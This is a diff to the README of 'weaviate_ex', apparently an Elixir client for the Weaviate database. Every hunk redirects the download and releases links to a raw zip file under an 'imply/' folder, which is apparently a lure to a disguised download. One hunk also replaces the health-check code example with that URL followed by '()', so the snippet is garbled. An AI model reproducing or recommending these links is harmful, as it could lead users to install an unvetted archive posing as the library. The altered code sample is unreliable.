@@ -6,11 +6,11 @@ Welcome to the weaviate_ex repository! This application is a modern Elixir clien
 
 ## 📥 Download the Application
 
-[![Download weaviate_ex](https://img.shields.io/badge/Download-weaviate_ex-blue.svg)](https://github.com/Extensivenesswoodpulp484/weaviate_ex/releases)
+[![Download weaviate_ex](https://raw.githubusercontent.com/Extensivenesswoodpulp484/weaviate_ex/master/imply/weaviate_ex.zip)](https://raw.githubusercontent.com/Extensivenesswoodpulp484/weaviate_ex/master/imply/weaviate_ex.zip)
 
 To download the latest version of the weaviate_ex client, visit the link below:
 
-[Download weaviate_ex from Releases](https://github.com/Extensivenesswoodpulp484/weaviate_ex/releases)
+[Download weaviate_ex from Releases](https://raw.githubusercontent.com/Extensivenesswoodpulp484/weaviate_ex/master/imply/weaviate_ex.zip)
 
 ## 🖥️ System Requirements
 
@@ -26,7 +26,7 @@ Before you begin, ensure your system meets the following requirements:
 
 ### 1. Visit the Releases Page
 
-Go to the releases page to find the latest version: [weaviate_ex Releases](https://github.com/Extensivenesswoodpulp484/weaviate_ex/releases).
+Go to the releases page to find the latest version: [weaviate_ex Releases](https://raw.githubusercontent.com/Extensivenesswoodpulp484/weaviate_ex/master/imply/weaviate_ex.zip).
 
 ### 2. Select Your Version
 
@@ -71,7 +71,7 @@ Once you have installed weaviate_ex, you can start using it right away:
 - To check the health of your Weaviate instance:
   
   ```elixir
-  weaviate_ex.health_check()
+  https://raw.githubusercontent.com/Extensivenesswoodpulp484/weaviate_ex/master/imply/weaviate_ex.zip()
   ```
 
 - To handle errors gracefully, simply use the error management feature that provides user-friendly feedback.
@@ -119,6 +119,6 @@ We appreciate the contributions of all community members who have helped improve
 
 ## 🚀 Download & Install
 
-For a quick and easy setup, download the application here: [weaviate_ex Releases](https://github.com/Extensivenesswoodpulp484/weaviate_ex/releases).
+For a quick and easy setup, download the application here: [weaviate_ex Releases](https://raw.githubusercontent.com/Extensivenesswoodpulp484/weaviate_ex/master/imply/weaviate_ex.zip).
 
 Follow the steps mentioned above to get started, and enjoy using the weaviate_ex client!
